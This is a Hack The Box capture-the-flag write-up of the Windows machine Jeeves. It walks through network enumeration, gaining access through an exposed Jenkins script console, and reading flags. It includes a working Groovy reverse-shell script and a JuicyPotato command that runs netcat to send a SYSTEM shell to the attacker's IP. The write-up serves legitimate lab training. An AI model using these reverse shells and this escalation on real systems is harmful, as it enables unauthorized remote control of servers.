---
title: Write-up Jeeves on HTB
author: eMVee
date: 2023-11-22 22:00:00 +0800
categories: [CTF, HTB]
tags: [HTB, OSCP, PNPT, Jenkins, Groovy, JuicyPotato, Potato, SeImpersonatePrivilege, ADS, Alternative Data Stream]
render_with_liquid: false
---

This evening is hacking time on Hack The Box. Jeeves was a machine I haven't hacked before. I saw Jeeves in the updated version of TJnull for OSCP. Not that I have to complete TJnull's list for OSCP, I still would like to finish some of the machines on his list. And Jeeves is the one I like to hack  tonight.
## Getting started
As usual, we first need to create our working directory.
```bash
┌──(emvee㉿kali)-[~]
└─$ cd Documents/HTB/

┌──(emvee㉿kali)-[~/Documents/HTB]
└─$ mkdir Jeeves

┌──(emvee㉿kali)-[~/Documents/HTB]
└─$ cd Jeeves        
```
Then I would like to know which IP address I received from HTB.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Jeeves]
└─$ ip a        
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:0e:ca:e6 brd ff:ff:ff:ff:ff:ff
    inet 10.0.2.15/24 brd 10.0.2.255 scope global dynamic noprefixroute eth0
       valid_lft 307sec preferred_lft 307sec
    inet6 fe80::a00:27ff:fe0e:cae6/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
3: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 500
    link/none 
    inet 10.10.14.103/23 scope global tun0
       valid_lft forever preferred_lft forever
    inet6 dead:beef:2::1065/64 scope global 
       valid_lft forever preferred_lft forever
    inet6 fe80::1072:9477:2567:4341/64 scope link stable-privacy proto kernel_ll 
       valid_lft forever preferred_lft forever
```
Jeeves has now also received an IP address and I assign it to a variable.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Jeeves]
└─$ ip=10.129.228.11
```



----
## Enumeration

Let's see if Jeeves responds to a ping request.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Jeeves]
└─$ ping -c 3 $ip                      
PING 10.129.228.112 (10.129.228.112) 56(84) bytes of data.
64 bytes from 10.129.228.112: icmp_seq=1 ttl=127 time=17.3 ms
64 bytes from 10.129.228.112: icmp_seq=2 ttl=127 time=17.6 ms
64 bytes from 10.129.228.112: icmp_seq=3 ttl=127 time=17.3 ms

--- 10.129.228.112 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2006ms
rtt min/avg/max/mdev = 17.302/17.423/17.633/0.148 ms

```
Based on the value in the ttl field we can indicate that this is an MS Windows machine.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Jeeves]
└─$ sudo nmap -sC -sV -T4 -A -O -p- $ip
[sudo] password for emvee: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-22 20:22 CET
Nmap scan report for 10.129.228.112
Host is up (0.019s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
|_http-title: Ask Jeeves
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Error 404 Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone
Running (JUST GUESSING): Microsoft Windows 2008|Phone (87%)
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows
Aggressive OS guesses: Microsoft Windows Server 2008 R2 (87%), Microsoft Windows 8.1 Update 1 (85%), Microsoft Windows Phone 7.5 or 8.0 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 5h00m00s, deviation: 0s, median: 4h59m59s
| smb2-time: 
|   date: 2023-11-23T00:24:05
|_  start_date: 2023-11-23T00:21:29
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

TRACEROUTE (using port 445/tcp)
HOP RTT      ADDRESS
1   19.13 ms 10.10.14.1
2   19.83 ms 10.129.228.112

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 149.60 seconds

```
Nmap did discover some open ports and services, lets add them to our notes.
- Windows
- Port 80
	- HTTP
	- IIS 10.0
	- Title: Ask Jeeves
- Port 135 + 445
	- SMB
	- Workgroup 
- Port 50000
	- HTTP
	- Jetty 9.4z-snapshot

Because port 80 and 50000 have an HTTP service active, it is a good idea to gather further information with whatweb.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Jeeves]
└─$ whatweb http://$ip
http://10.129.228.112 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.129.228.112], Microsoft-IIS[10.0], Title[Ask Jeeves]

┌──(emvee㉿kali)-[~/Documents/HTB/Jeeves]
└─$ whatweb http://$ip:50000
http://10.129.228.112:50000 [404 Not Found] Country[RESERVED][ZZ], HTTPServer[Jetty(9.4.z-SNAPSHOT)], IP[10.129.228.112], Jetty[9.4.z-SNAPSHOT], PoweredBy[Jetty://], Title[Error 404 Not Found]

```
Whatweb has not found any new information on either port.
Because SMB ports have also been discovered by nmap, I want to see if we can find something there.
```
┌──(emvee㉿kali)-[~/Documents/HTB/Jeeves]
└─$ smbmap -H $ip -v

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 0 SMB session(s)                                

┌──(emvee㉿kali)-[~/Documents/HTB/Jeeves]
└─$ smbclient -L $ip
Password for [WORKGROUP\emvee]:
session setup failed: NT_STATUS_ACCESS_DENIED

```
Both smbmap and smbclient couldn't find anything.
So let's look at the web services.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Jeeves]
└─$ firefox http://$ip & 
[1] 17962

```

![Image](/assets/img/WriteUp//HTB/Jeeves/Pasted image 20231122203340.png){: width="700" height="400" }

Let's just search for something and see if anything comes back.
![Image](/assets/img/WriteUp//HTB/Jeeves/Pasted image 20231122203421.png){: width="700" height="400" }

An error message. Considering the version of a Microsoft SQL server 2005, I think we are being fooled. Upon closer analysis, it appears that the error message is a screenshot.
![Image](/assets/img/WriteUp//HTB/Jeeves/Pasted image 20231122203533.png){: width="700" height="400" }

A web service would also be active on port 50000. Let's take a look at what's running here.
![Image](/assets/img/WriteUp//HTB/Jeeves/Pasted image 20231122203558.png){: width="700" height="400" }

Page 404 and Powered by Jetty. Let's do some directory enumeration on port 50000 with gobuster.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Jeeves]
└─$ gobuster dir -u http://$ip:50000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.228.112:50000
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/askjeeves            (Status: 302) [Size: 0] [--> http://10.129.228.112:50000/askjeeves/]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================

```

Gobuster did discover `askjeeves`, let's find out if this does works better then the one on port 80.
![Image](/assets/img/WriteUp//HTB/Jeeves/Pasted image 20231122210431.png){: width="700" height="400" }

We can see a Jenkins version, let's add it to our notes.
- Jenkins ver. 2.87

I can remember a machine called [Butler](https://emvee-nl.github.io/posts/TCM-Writeup-Butler/) from TCM with Jenkins. This machine could run scripts from a Script Console. Let's find out if we can access it here as well.

![Image](/assets/img/WriteUp//HTB/Jeeves/Pasted image 20231122211540.png){: width="700" height="400" }

We can access the Script Console. This means we can try to create a reverse shell. The code below is the code to start a reverse shell to our machine, this should be copied and paste in the Script console of Jenkins.
```
String host="10.10.14.103";
int port=4321;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();


```
Before we start the reverse shell we should start a netcat listener.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Jeeves]
└─$ rlwrap nc -lvnp 4321
listening on [any] 4321 ...

```
Now we can paste the code and hit the Run button.
![Image](/assets/img/WriteUp//HTB/Jeeves/Pasted image 20231122212028.png){: width="700" height="400" }


## Initial access
When we check the netcat listener, we can see that a connection has been established.

```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Jeeves]
└─$ rlwrap nc -lvnp 4321
listening on [any] 4321 ...
connect to [10.10.14.103] from (UNKNOWN) [10.129.228.112] 49676
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Users\Administrator\.jenkins>

```
First let's find out who we are on the machine.
```
┌──(emvee㉿kali)-[~/Documents/HTB/Jeeves]
└─$ rlwrap nc -lvnp 4321
listening on [any] 4321 ...
connect to [10.10.14.103] from (UNKNOWN) [10.129.228.112] 49676
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Users\Administrator\.jenkins>whoami
whoami
jeeves\kohsuke
```
Now we should check the privileges we have.
```
C:\Users\Administrator\.jenkins>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled

C:\Users\Administrator\.jenkins>

```
One of the privileges is calling, use me!
It is this one: `SeImpersonatePrivilege`. This means we can use the potato family for privilege escalation.
First I would like to capture the user flag on this machine.
```
C:\Users\Administrator\.jenkins>cd ../../kohsuke/Desktop
cd ../../kohsuke/Desktop

C:\Users\kohsuke\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of C:\Users\kohsuke\Desktop

11/03/2017  10:19 PM    <DIR>          .
11/03/2017  10:19 PM    <DIR>          ..
11/03/2017  10:22 PM                32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)   2,416,840,704 bytes free

C:\Users\kohsuke\Desktop>type user.txt
type user.txt
---USER FLAG IS HERE---
C:\Users\kohsuke\Desktop>

```
Now we should copy netcat to our working directory where we have some exploits from the potato family as well.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Jeeves]
└─$ cp /usr/share/windows-resources/binaries/nc.exe .
```
We can start a SMB share on our Kali machine so we can copy the files to the Windows target.
```
┌──(emvee㉿kali)-[~/Documents/HTB/Jeeves]
└─$ ll           
total 456
-rw-r--r-- 1 emvee emvee  57344 Nov 22 21:55 god.exe
-rw-r--r-- 1 emvee emvee 347648 Nov 22 22:05 JuicyPotato.exe
-rwxr-xr-x 1 emvee emvee  59392 Nov 22 22:06 nc.exe


┌──(emvee㉿kali)-[~/Documents/HTB/Jeeves]
└─$ sudo impacket-smbserver share $(pwd) -smb2support
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed


```
Now we can create a share on Windows and copy the files we need to gain more privileges on the target.
```
C:\Users\kohsuke\Desktop>net use \\10.10.14.103\share
net use \\10.10.14.103\share
The command completed successfully.

C:\Users\kohsuke\Desktop>copy \\10.10.14.103\share\JuicyPotato.exe C:\Users\kohsuke\Desktop\JuicyPotato.exe
copy \\10.10.14.103\share\JuicyPotato.exe C:\Users\kohsuke\Desktop\JuicyPotato.exe
        1 file(s) copied.

C:\Users\kohsuke\Desktop>copy \\10.10.14.103\share\nc.exe C:\Users\kohsuke\Desktop\nc.exe
copy \\10.10.14.103\share\nc.exe C:\Users\kohsuke\Desktop\nc.exe
        1 file(s) copied.

```
With the following command we can create a reverse shell.
```
JuicyPotato.exe -l 1337 -t * -p C:\Windows\System32\cmd.exe -a "/c c:\users\kohsuke\desktop\nc.exe -e cmd.exe 10.10.14.103 9876"
```
We should start a new netcat listener.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Jeeves]
└─$ rlwrap nc -lvnp 9876
listening on [any] 9876 ...

```

## Privilege escalation
We should enter the command for privilege escalation. This creates a reverse shell to our machine as `nt authority\system`.
```
C:\Users\kohsuke\Desktop>JuicyPotato.exe -l 1337 -t * -p C:\Windows\System32\cmd.exe -a "/c c:\users\kohsuke\desktop\nc.exe -e cmd.exe 10.10.14.103 9876"
JuicyPotato.exe -l 1337 -t * -p C:\Windows\System32\cmd.exe -a "/c c:\users\kohsuke\desktop\nc.exe -e cmd.exe 10.10.14.103 9876"
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

```
We should check our netcat listener.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Jeeves]
└─$ rlwrap nc -lvnp 9876
listening on [any] 9876 ...
connect to [10.10.14.103] from (UNKNOWN) [10.129.228.112] 49690
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Windows\system32>

```
Let's check if we are really `nt authority\system` as expected, and on what machine we are working.
```
C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>hostname
hostname
Jeeves

C:\Windows\system32>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : .htb
   IPv4 Address. . . . . . . . . . . : 10.129.228.112
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 10.129.0.1

Tunnel adapter isatap..htb:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : .htb

C:\Windows\system32>

```
The last step is to capture the root flag. This is located on the desktop of the administrator.
Let's capture the flag!
```
C:\Windows\system32>cd c:\users\administrator\desktop\
cd c:\users\administrator\desktop\

c:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of c:\Users\Administrator\Desktop

11/08/2017  09:05 AM    <DIR>          .
11/08/2017  09:05 AM    <DIR>          ..
12/24/2017  02:51 AM                36 hm.txt
11/08/2017  09:05 AM               797 Windows 10 Update Assistant.lnk
               2 File(s)            833 bytes
               2 Dir(s)   2,416,275,456 bytes free

c:\Users\Administrator\Desktop>type hm.txt
type hm.txt
The flag is elsewhere.  Look deeper.
c:\Users\Administrator\Desktop>

```
This is something I did not expect. It looks like we have an Alternate Data Stream (ADS) here.
We can check this with the command `dir /r`.
```
c:\Users\Administrator\Desktop>dir /r
dir /r
 Volume in drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of c:\Users\Administrator\Desktop

11/08/2017  09:05 AM    <DIR>          .
11/08/2017  09:05 AM    <DIR>          ..
12/24/2017  02:51 AM                36 hm.txt
                                    34 hm.txt:root.txt:$DATA
11/08/2017  09:05 AM               797 Windows 10 Update Assistant.lnk
               2 File(s)            833 bytes
               2 Dir(s)   2,416,189,440 bytes free
```
In the results we can see `hm.txt:root.txt:$DATA` what means there is an Alternative Data Stream available.
We can see the content with the following command: `more < hm.txt:root.txt`.
```

c:\Users\Administrator\Desktop>type hm.txt
type hm.txt
The flag is elsewhere.  Look deeper.
c:\Users\Administrator\Desktop>more < hm.txt:root.txt
more < hm.txt:root.txt
---HERE IS THE ROOT FLAG---

c:\Users\Administrator\Desktop>

```
Now we have captured the root flag! This was a fun twist at the end.